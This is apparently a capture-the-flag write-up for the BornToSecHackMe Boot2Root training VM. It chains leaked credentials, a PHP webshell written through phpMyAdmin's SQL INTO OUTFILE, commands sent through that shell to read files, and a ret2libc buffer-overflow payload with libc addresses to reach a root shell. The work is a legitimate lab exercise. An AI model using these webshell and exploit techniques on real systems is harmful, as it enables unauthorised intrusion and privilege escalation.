# Boot2Root — Writeup 1

**Target:** `BornToSecHackMe-v1.1.iso`
**Goal:** Become `root` (uid=0, real shell)
**VM IP:** `192.168.56.101`

---

## Step 0 — VM Setup

Boot the ISO in VirtualBox with a host-only network adapter so the host machine can reach the VM.

```bash
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

VBoxManage createvm --name "boot2root" --ostype Ubuntu_64 --register
VBoxManage modifyvm "boot2root" --memory 1024 --vram 16
VBoxManage modifyvm "boot2root" --boot1 dvd --boot2 none
VBoxManage storagectl "boot2root" --name "IDE" --add ide
VBoxManage storageattach "boot2root" \
  --storagectl "IDE" --port 0 --device 0 \
  --type dvddrive --medium "BornToSecHackMe-v1.1.iso"
VBoxManage modifyvm "boot2root" --nic1 hostonly --hostonlyadapter1 vboxnet0
VBoxManage startvm "boot2root" --type headless
```

---

## Step 1 — Reconnaissance

### Host Discovery

```bash
nmap -sn 192.168.56.0/24
# 192.168.56.101 → target VM
```

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 192.168.56.101
```

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 2.0.8 |
| 22 | SSH | OpenSSH 5.9p1 |
| 80 | HTTP | Apache 2.2.22 |
| 143 | IMAP | Dovecot |
| 443 | HTTPS | Apache 2.2.22 (CN=BornToSec) |
| 993 | IMAPS | Dovecot |

### Web Enumeration

```bash
gobuster dir -u http://192.168.56.101  -w /tmp/common.txt -t 50 --no-error
gobuster dir -u https://192.168.56.101 -w /tmp/common.txt -t 50 --no-error -k
```

HTTPS reveals:
- `/forum` → 301 (MyLittleForum 2.3.4)
- `/phpmyadmin` → 301
- `/webmail` → 301

---

## Step 2 — lmezard Credentials (Forum)

Forum post `https://192.168.56.101/forum/index.php?id=6` contains a pasted SSH auth log. User `lmezard` accidentally typed their password in the username field:

```
Oct  5 08:45:40 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ
```

**Credentials:**
```
user: lmezard
pass: !q\]Ej?*5K5cy*AJ
```

SSH login fails (restricted). Forum login succeeds.

---

## Step 3 — Database Credentials (Webmail)

Logging into the forum as `lmezard` reveals the registered email. Using that to log into `https://192.168.56.101/webmail/`, an email from admin is found:

```
Hey Laurie,
You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
Best regards.
```

**phpMyAdmin credentials:** `root / Fg-'kKXBj87E:aJ$`

---

## Step 4 — Webshell via phpMyAdmin

Login to `https://192.168.56.101/phpmyadmin/` as root. Execute SQL to write a PHP webshell to a web-accessible directory:

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

Verify:
```bash
curl -sk "https://192.168.56.101/forum/templates_c/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Step 5 — lmezard FTP (LOOKATME)

Enumerate the filesystem via the webshell:

```bash
curl -sk "https://192.168.56.101/forum/templates_c/shell.php?cmd=cat+/home/LOOKATME/password"
# lmezard:G!@M6f4Eatau{sF"
```

Login to FTP with these credentials:

```
ftp 192.168.56.101
user: lmezard
pass: G!@M6f4Eatau{sF"
python3 ftpsh.py 192.168.56.101 lmezard

```

Files found: `README`, `fun`

```
README: Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

---

## Step 6 — laurie SSH (fun/reassemble challenge)

`fun` is a tar archive containing 750 `.pcap` files (actually C code fragments), each with a `//fileN` comment indicating order. Reassemble and compile them:

```bash
#!/bin/bash
FT_FUN="fun/ft_fun"
OUTPUT="/tmp/reassembled.c"
TOTAL=$(ls "$FT_FUN" | wc -l)
for i in $(seq 1 "$TOTAL"); do
    f=$(grep -rl "//file${i}$" "$FT_FUN" 2>/dev/null)
    [ -n "$f" ] && grep -v "//file" "$f" >> "$OUTPUT"
done
gcc "$OUTPUT" -o /tmp/fun_bin && /tmp/fun_bin
```

Output:
```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

```bash
echo -n "Iheartpwnage" | sha256sum
# 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

**SSH:** `laurie / 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

---

## Step 7 — thor SSH (Bomb Lab)

`laurie`'s home contains a binary `bomb` with 6 phases. README hints: `P 2 b o 4`.

Solve each phase via GDB (`disas phase_N`):

| Phase | Answer | Notes |
|-------|--------|-------|
| 1 | `Public speaking is very easy.` | Direct string compare at `0x80497c0` |
| 2 | `1 2 6 24 120 720` | Factorial sequence: `a[i] = (i+1) * a[i-1]` |
| 3 | `1 b 214` | Switch on first int → char `0x62` ('b'), check `0xd6` (214) |
| 4 | `9` | `func4` is Fibonacci; `func4(9) = 55 = 0x37` |
| 5 | `opekmq` | Each char's low nibble indexes into `"isrveawhobpnutfg"` → `"giants"` |
| 6 | `4 2 6 3 1 5` | Linked list sorted descending by node value |

```bash
echo -e "Public speaking is very easy.\n1 2 6 24 120 720\n1 b 214\n9\nopekmq\n4 2 6 3 1 5" | ./bomb
```

thor's SSH password is the 6 answers concatenated:
```
Publicspeakingisveryeasy.1 2 6 24 120 7201 b 2149opekmq4 2 6 3 1 5
```

---

## Step 8 — zaz SSH (Turtle challenge)

`thor`'s home contains a `turtle` file with French turtle graphics commands and a `turtle.py` renderer. The file draws 5 letters:

```python
# scripts/decode_turtle.py — simulates movements and renders to PNG
```

The letters spell **SLASH**. Last line of the file: `"Can you digest the message? :)"` — hints at MD5 (Message Digest).

```bash
echo -n "SLASH" | md5sum
# 646da671ca01bb5d84dbb5fb2238dc8e
```

**SSH:** `zaz / 646da671ca01bb5d84dbb5fb2238dc8e`

---

## Step 9 — root (Buffer Overflow — ret2libc)

`zaz`'s home contains a setuid binary `exploit_me`:

```c
// Vulnerable code (reconstructed):
char buffer[128];
strcpy(buffer, argv[1]);  // No bounds check!
```

### Analysis

```
sub esp, 0x90         ; 144 bytes allocated
lea eax, [esp+0x10]   ; buffer at esp+0x10
call strcpy           ; unchecked copy of argv[1]
```

**Offset to EIP:** 140 bytes (confirmed via cyclic pattern — EIP = `0x37654136` = "6Ae7" at offset 140)

### ret2libc Exploit

Find addresses in GDB:

```gdb
p system   # 0xb7e6b060
p exit     # 0xb7e5ebe0
find 0xb7e2c000, 0xb7fd2000, "/bin/sh"  # 0xb7f8cc58
```

Payload structure: `[140 bytes padding] + [system()] + [exit()] + ["/bin/sh"]`

```bash
./exploit_me $(python -c "print 'A'*140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'")
```

```
# whoami
root
```

---

## Summary

```
[Web] Forum post (SSH log) → lmezard credentials
  → [Web] Webmail email → DB credentials
    → [phpMyAdmin] SQL INTO OUTFILE → www-data shell
      → [FS] /home/LOOKATME/password → lmezard FTP
        → [FTP] fun archive → reassemble C → SHA256 → laurie SSH
          → [SSH] bomb binary → 6-phase reverse engineering → thor SSH
            → [SSH] turtle graphics → SLASH → MD5 → zaz SSH
              → [Binary] exploit_me → ret2libc → root
```
